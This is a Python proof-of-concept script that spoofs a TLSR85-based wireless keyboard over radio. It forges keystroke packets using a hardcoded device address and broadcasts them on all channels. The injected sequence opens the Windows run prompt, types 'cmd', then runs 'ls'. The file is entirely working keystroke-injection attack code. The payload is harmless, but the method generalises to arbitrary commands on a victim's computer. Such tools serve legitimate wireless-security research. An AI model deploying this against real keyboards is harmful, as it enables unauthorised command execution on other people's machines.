#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Dummy spoofer for TLSR85 based devices
# Address of keyboard is hardcoded

import time

from binascii import unhexlify
from lib import common
from devices.TLSR85.tlsr85 import Tlsr85
from devices.TLSR85.tlsr85_keyboard import *


common.init_args('./tlsr85-spoofing.py')
common.parse_and_init()

trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", 22, 0x11021, 0x24bf, 2)
# base address for poss : "d5:54:cb"
# crc init for poss: 0xcb01


channels = Tlsr85.CHANNELS
channel_index = 0
# Need to set channel to prevent USBError (somehow)
common.radio.set_channel(channels[channel_index])
rate = Tlsr85.RATE

# TODO put preamble in tlsr85
preamble =b"\xAA\xAA\xB5"

attack = [
    trust_keyboard.build_packet(modifiers=[Tlsr85KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.3),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_C]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_M]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.3),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_L]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_S]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

# send payload
common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=common.RF_RATE_2M)
for payload in attack:
    if callable(payload):
        payload() # in case we want a delay
    else:
        for i in range(len(channels)):
            common.radio.set_channel(channels[i])
            for _ in range(20):
                common.radio.transmit_payload_generic(payload=preamble + payload, address=unhexlify(trust_keyboard.base_address.replace(':', '')))
                time.sleep(0.0001)